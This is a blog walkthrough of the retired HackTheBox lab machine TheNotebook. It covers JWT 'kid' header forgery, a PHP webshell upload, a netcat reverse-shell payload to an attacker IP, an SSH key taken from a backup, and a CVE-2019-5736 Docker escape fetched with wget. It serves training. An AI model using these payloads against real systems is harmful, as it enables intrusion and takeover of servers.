---
category: Walkthrough
date: 2021-07-31 12:00:00
header:
  og_image: https://i.imgur.com/Arm1Pyr.png
  teaser: https://i.imgur.com/Arm1Pyr.png
language: en-US
namespace: htb-thenotebook
redirect_from: /writeup/2021/07/htb-thenotebook
tags:
- HackTheBox
- HTB Medium
- HTB Linux
title: 'Walktrough: HTB TheNotebook'
---

Hello guys!

This week's machine will be **TheNotebook**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [mostwanted002](https://app.hackthebox.eu/users/120514).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB TheNotebook](https://i.imgur.com/DSrrFJP.png){: .align-center}

This box was a very interesting one, where I had the opportunity to learn more about JWT Tokens in the path for initial access and then more docker escaping techniques abusing capabilities so I could get root.

## Enumeration

As usual, we start with a quick `nmap` scan to see which services are published in this box.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.230                                                                                       
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 15:05 -03
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.230
Host is up (0.072s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

### 80/TCP - HTTP Service

Accessing the page, noticed that is a simple HTTP application, which uses the default [Bootstrap](https://getbootstrap.com/) and no sign of a CMS like WordPress or other known application.

![HTB TheNotebook - 80/TCP](https://i.imgur.com/kJx4QaU.png){: .align-center}

The guessing was confirmed during `whatweb` execution, which listed only the two known components, as well as the webserver it is running on which is an *Nginx*.

```bash
$ whatweb 10.10.10.230
http://10.10.10.230 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.10.230], Title[The Notebook - Your Note Keeper], nginx[1.14.0]
```

Checking the website with `gobuster` found the following application pages but were the same already seen inspecting the source code during initial navigation.

```bash
$ gobuster dir -u http://10.10.10.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -t 50 -o gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.230
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2021/06/10 16:04:30 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1250]
/register             (Status: 200) [Size: 1422]
/admin                (Status: 403) [Size: 9]
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]

===============================================================
2021/06/10 16:34:27 Finished
===============================================================
```

As I haven't found anything specific, decided to poke a little bit with this app, while inspecting the requests using Burp Suite, looking for an opportunity.

Started by creating an account, clicking on the *Register* link where some basic information was requested as the image below, and resulted in the account creation without any further problem.

![HTB TheNotebook - SignUp](https://i.imgur.com/e49Cij7.png){: .align-center}

After being created, was redirected to a logged page where I was able to create some notes but interacting with these resources didn't seem that they could be exploited, unless the app would be vulnerable by some kind of **SSTI** (Server-Side Template Injection) once these notes are shown in the page.

![HTB TheNotebook - Logged User](https://i.imgur.com/hPKhMaT.png){: .align-center}

Inspecting the requests made so far in Burp since the account creation, nothing interesting was found in the request that could be tampered with to grant us a privileged account but his response is interesting. In this response, we receive a `Set-Cookie` for an object named `auth`, which contained something that resembled a **Token JWT**.

```http
HTTP/1.1 302 FOUND
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 10 Jun 2021 20:46:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://10.10.10.230/
Connection: close
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjowfQ.Ixm8_VYcfY_WAv0L7i27vyOW15dd2UuhhlOrRaSiwVFyge6_JmC2FjUEYHNh_j4xXFjfaeUR7gkifezXjsJwz99U1zpcp0CaOI9-RWXLSTpnZvprcCCyN5seCkJHNx45-Qb5mCjGDGQbrxkrcUuV8tVcdkEpFi90BfXL6XGGxJe-Ms6YiDWK1fhpaGfKXcRyAYUGWoTs62ulrVwV5fKhH978OE17egmvNWpOL0dNpmpdoCTTKYBX1KDyyFMWJvZWkydPCNPPAaqk0pNxSwiWOYzBBErx2EBd58gpZWlBLNf5JnjyoBXdHt4JdHVcpoZsmBsAT_gxRU_uffzwxTNQN9-vrsA7tLzWuyWWt32s_8hGGrauEBSW4aPP5xRbpGclDfw2KPa7qHdVa5SApHHQrDFfpxhU2hFjvjlBtmwfjJbNHb53ZRXmz0SPRLKf6sOpX3Iswld58yBYP9xtIr3eCsdW1boCsDflfjUi9LQqsM3d_PTgGgzBLIXBQXXj82i0CzlwD3rYl3AjR7IBgBZNee5HJVdNUPYx6e_uG7WU94LUBy7WsfPfYY8VHjbuWVY1Nq3Wqhg2Sb04XmWBbtbV5C12YOu-oA7A6KrloeGOjLHkIlTsnLAj3eNhl_eo5aiLuQL3P5HrGr0K_rrniLHTCGTWX3KM4qgtI57IsbXN0Dw; Path=/
Set-Cookie: uuid=796e6cc3-aa50-4f87-b74f-408146886c66; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
```

Checking its content at [jwt.ms](https://jwt.ms/), noticed some details that could allow us to elevate our privileges:

- `kid` header, which defines the private key location in an HTTP Server running locally in the application server, is used to sign and evaluate the issued token.
- `admin_cap` payload, which possibly contains a binary or integer that **represents the privilege/role** of the user, that for our recently created account is 0.

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}.{
  "username": "jdoe",
  "email": "jdoe@dummy.com",
  "admin_cap": 0
}.[Signature]
```

The fact is: We cannot modify the issued token without signing it again with the key available in the server, but, once the token has a field pointing to the path to the key to which it was signed, we could get a chance to recreate this token, signing it with our own RSA key and **making it available to the backend** during our credential validation, but we can only be sure testing :stuck_out_tongue_winking_eye:.

## Initial access

Once we need to create a token, searching for the easiest way to do it I have found a python library called [PyJWT](https://pyjwt.readthedocs.io/en/stable/) that seemed quite easy to be used. In the initial docs page, we have a sample code signing a token but we need to dig further in their documentation to find a way to add the `kid` header and create the cert.

Achieved the desired outcome by running the following steps:

- Created the RSA key using the command line below. We'll have as output the content of the public key and, in the specified file, the private key.

```bash
openssl req -nodes -new -x509 -keyout privKey.key -noout -pubkey
```

- Published the private key using a simple HTTP Server, using the same port web server was using in the observed token.

```bash
python3 -m http.server 7070
```

- After creating the key, wrote a script as content below using the obtained values of public and private keys and signed the payload. This script uses examples located at [Usage Examples](https://pyjwt.readthedocs.io/en/stable/usage.html) in the official module documentation.

  - Necessary to install the module using the command `pip3 install pyjwt`. In case `jwt` module is already installed, necessary to remove it first, otherwise, the script will fail.

```python
#!/usr/bin/python3
import jwtprivate_key = b"""-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDT/8rR3ZkWJOJN
[...]
XDmj7j8p7kdd2ZM1MYTO6A0=
-----END PRIVATE KEY-----"""
payload = {
    "username": "jdoe",
    "email": "jdoe@dummy.com",
    "admin_cap": 1
}
header = {"kid": "http://10.10.10.10:7070/privKey.key"}
encoded = jwt.encode(payload, private_key, algorithm="RS256",headers=header)
print(encoded)
```

  Sample output is pasted below:

```bash
$ python3 generate-jwt.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg
```

  The generated token, according to jwt.ms, generated the payload below:

```json
{
    "typ": "JWT",
    "alg": "RS256",
    "kid": "http://10.10.10.10:7070/privKey.key"
}.{
    "username": "jdoe",
    "email": "jdoe@dummy.com",
    "admin_cap": 1
}.[Signature]
```

- As everything went as expected, is now time to change the cookie value in the browser and **:boom:**: a request was received in the python webserver by the backend, and we can now see the **Admin Panel** option while accessing the portal :smile:

```bash
python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...10.10.10.230 - - [10/Jun/2021 18:45:24] "GET /privKey.key HTTP/1.1" 200 -
```

![HTB TheNotebook - Admin Panel](https://i.imgur.com/NrGXJx9.png){: .align-center}

- Analyzing what we can do next with the permissions we have from an administrator perspective, we can see two options: list existing notes and upload a file.

![HTB TheNotebook - Admin Options](https://i.imgur.com/fSYkzLZ.png){: .align-center}

- Reviewing the content of existing notes, we were able to see all notes in the app, as the table below. Pay attention to the notes from **admin** which mentions an existing backup in the server as well as the **ability to execute PHP files in the server**:

| Title                 | Note                                                         | Owner |
| --------------------- | ------------------------------------------------------------ | ----- |
| Need to fix config    | Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server. | admin |
| Backups are scheduled | Finally! Regular backups are necessary. Thank god it's all easy on server. | admin |
| The Notebook Quotes   | "I am nothing special, of this I am sure. I am a common man with common thoughts and I've led a common life. There are no monuments dedicated to me and my name will soon be forgotten, but I've loved another with all my heart and soul, and to me, this has always been enough.." ― Nicholas Sparks, The Notebook "So it's not gonna be easy. It's going to be really hard; we're gonna have to work at this everyday, but I want to do that because I want you. I want all of you, forever, everyday. You and me... everyday." ― Nicholas Sparks, The Notebook "You can't live your life for other people. You've got to do what's right for you, even if it hurts some people you love." ― Nicholas Sparks, The Notebook "You are, and always have been, my dream." ― Nicholas Sparks, The Notebook "You are my best friend as well as my lover, and I do not know which side of you I enjoy the most. I treasure each side, just as I have treasured our life together." ― Nicholas Sparks, The Notebook "I love you. I am who I am because of you. You are every reason, every hope, and every dream I've ever had, and no matter what happens to us in the future, everyday we are together is the greatest day of my life. I will always be yours. " ― Nicholas Sparks, The Notebook "We fell in love, despite our differences, and once we did, something rare and beautiful was created. For me, love like that has only happened once, and that's why every minute we spent together has been seared in my memory. I'll never forget a single moment of it." ― Nicholas Sparks, The Notebook | noah  |
| Is my data safe?      | I wonder is the admin good enough to trust my data with?     | noah  |

Once we could possibly upload and run PHP files, decided to make a test, following the steps below:

- Accessing the *File Upload* we have a simple page to post our files, where we're going to inspect the requests using burp.

  ![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png){: .align-center}

  - Creating a simple webshell with the content `<?php system($_GET['cmd']);?>`, made its upload and didn't received any warning or block during the action.

  - After uploading it, the file was listed on the page, and hitting the *View* butting, we were redirected to the path where the file was, allowing us to see the rendered content.

  ![HTB TheNotebook - Uploaded Files](https://i.imgur.com/aCdIwnN.png){: .align-center}

  - Adding a simple query string at its end, as expected by our simple web shell, to run the id command (`cmd=id`) and we could confirm that we have code execution in the server :smiley:

  ![HTB TheNotebook - Simple WebShell](https://i.imgur.com/eSH3rQY.png){: .align-center}

  - To get a reverse shell, configured a listener and then sent another payload, this time to get a TCP connection from the server, which worked as expected :smile:

```http
GET /1e49f8a12603040cc99b2dd39f423b09.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.10.10+4443+>/tmp/f HTTP/1.1
Host: 10.10.10.230
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg; uuid=d3f32390-d9e4-4eb0-b1a0-788b54fd8278
Connection: close
```

## User flag

After obtaining the reverse shell, started enumerating the box with the account `www-data`, which is the one used by the web server execution. The following items stood out from the others listed during `linpeas.sh` execution:

- Users with console and their permissions

  - `noah:x:1000:1000:Noah:/home/noah:/bin/bash`
  - `root:x:0:0:root:/root:/bin/bash`

- Existence of `/var/backups` folder, also mentioned in the previously seen notes.

As this was previously mentioned, started by inspecting the contents of `/var/backups`, where most of the files we couldn't read except for the `home.tar.gz`, which could have some interesting information.

```bash
www-data@thenotebook:/var/backups$ ls -la
total 696
drwxr-xr-x  2 root root     4096 Jun 11 06:26 .
drwxr-xr-x 14 root root     4096 Feb 12 06:52 ..
-rw-r--r--  1 root root    51200 Jun 11 06:25 alternatives.tar.0
-rw-r--r--  1 root root    33252 Feb 24 08:53 apt.extended_states.0
-rw-r--r--  1 root root     3609 Feb 23 08:58 apt.extended_states.1.gz
-rw-r--r--  1 root root     3621 Feb 12 06:52 apt.extended_states.2.gz
-rw-r--r--  1 root root      437 Feb 12 06:17 dpkg.diversions.0
-rw-r--r--  1 root root      172 Feb 12 06:52 dpkg.statoverride.0
-rw-r--r--  1 root root   571460 Feb 24 08:53 dpkg.status.0
-rw-------  1 root root      693 Feb 17 13:18 group.bak
-rw-------  1 root shadow    575 Feb 17 13:18 gshadow.bak
-rw-r--r--  1 root root     4373 Feb 17 09:02 home.tar.gz
-rw-------  1 root root     1555 Feb 12 06:24 passwd.bak
-rw-------  1 root shadow   1024 Feb 12 07:33 shadow.bak
```

Expanding the archive, noticed that the folder structure was from `noah`'s home directory, including some ssh keys that might be useful.

```bash
$ tar -xzvf home.tar.gz
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
```

Using the key found, was able to connect using SSH as noah and retrieve the user flag.

```bash
$ ssh -i id_rsa noah@10.10.10.230
noah@thenotebook:~$ cat user.txt
<redacted>
```

## Root flag

As usual, before giving another try with `linenum.sh` with different privileges, ran `sudo -l` which returned the following content:

```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

As we have access to run any command in the docker container with **exec**, began by entering in an interactive shell as the command below.

```bash
sudo /usr/bin/docker exec -it webapp-dev01 bash
```

Inside the container, was able to see the files used while publishing the website, where we can look for sensitive information

```bash
root@7228ddf52a0f:/opt/webapp# ls -la
total 2244
drwxr-xr-x 1 root root    4096 Jun 11 07:04 .
drwxr-xr-x 1 root root    4096 Feb 12 07:30 ..
drwxr-xr-x 1 root root    4096 Feb 12 07:30 __pycache__
drwxr-xr-x 3 root root    4096 Nov 18  2020 admin
-rw-r--r-- 1 root root    3303 Nov 16  2020 create_db.py
-rwxr-xr-x 1 root root 2236814 Jun 11 07:04 main
-rw-r--r-- 1 root root    9517 Feb 11 15:00 main.py
-rw------- 1 root root    3247 Feb 11 15:09 privKey.key
-rw-r--r-- 1 root root      78 Feb 12 07:12 requirements.txt
drwxr-xr-x 3 root root    4096 Nov 19  2020 static
drwxr-xr-x 2 root root    4096 Nov 18  2020 templates
-rw-r--r-- 1 root root      20 Nov 20  2020 webapp.tar.gz
```

Checking the content of these files, in `create_db.py` noticed two password hashes for users `noah` and `admin`, which I decided to search on the internet first if they have already been cracked.

```python
 users = [
        User(username='admin', email='admin@thenotebook.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"),
        User(username='noah', email='noah@thenotebook.local', uuid=noah_uuid, password="e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2")
    ]
```

As haven't found anything in public sites (Crackstation, for example) this means that these passwords are not present in known wordlists like `rockyou.txt`, frequently used in CTFs. Decided to go further enumerating for other vulnerabilities in docker, specifically *docker breakout*, allowing us to escape to the host.

Searching for some information, found the repo [stealthcopter/deepce: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) (github.com)](https://github.com/stealthcopter/deepce) where there's a script that can help us enumerate the container characteristics known to be helpful in this kind of situation.

Executing it in the container, noticed that we could have a chance on doing it as there were capabilities (in red) that could allow us to read and write files in the host, but using the options in the tool didn't allow me to achieve the expected outcome.

![HTB TheNotebook - deepce output](https://i.imgur.com/0L7480D.png){: .align-center}

As I haven't found anything in the files, decided to search for specific vulnerabilities that could abuse capabilities like the ones we have found, where I found about CVE-2019-5736 while browsing for docker vulns in [CVE Details](https://www.cvedetails.com/). This vuln represents exactly the type of abuse we need based on our situation and, due to its high CVSS score (9.3) probably there is a ready exploit to be used.

![CVE Details - CVE-2019-5736](https://i.imgur.com/CqvPKK3.png){: .align-center}

Searching for exploits I came across the repo [Frichetten/CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com)](https://github.com/Frichetten/CVE-2019-5736-PoC) which had a PoC written in Golang that supposedly would attend to our scenario, while other PoCs found required us to be able to run other containers (`docker run`) in the host, not covered by our sudo privileges.

To obtain the root shell, the following steps were executed, as also seen in this blog post ([Reproduction of docker escape vulnerability (CVE-2019-5736) - Programmer Sought](https://www.programmersought.com/article/71804432772/))

- Downloaded and edited the script `escape.go` to give us a reverse shell.

- Compiled it using the parameters below

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build escape.go
```

- Copied the exploit to the victim machine, inside the container, followed by its execution

```bash
wget http://10.10.10.10/escape
chmod +x escape
./escape
```

- Once the exploit replaces the file `/bin/sh` with the malicious script, execute the command line below to trigger the exploration

```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

After this execution, was received a reverse shell in the listener previously configured and was able to get the root's flag

```bash
$ sudo nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.230] 35856
bash: cannot set terminal process group (1617): Inappropriate ioctl for device
bash: no job control in this shell
<4de4eaff90e275467ff2103ff7b6eb2b1ffaf63d44f72a2b2# id
id
uid=0(root) gid=0(root) groups=0(root)
root@thenotebook:/root# cat root.txt
\cat root.txt
<redacted>
```

I hope you guys have enjoyed it!

See you in the next post :smiley:
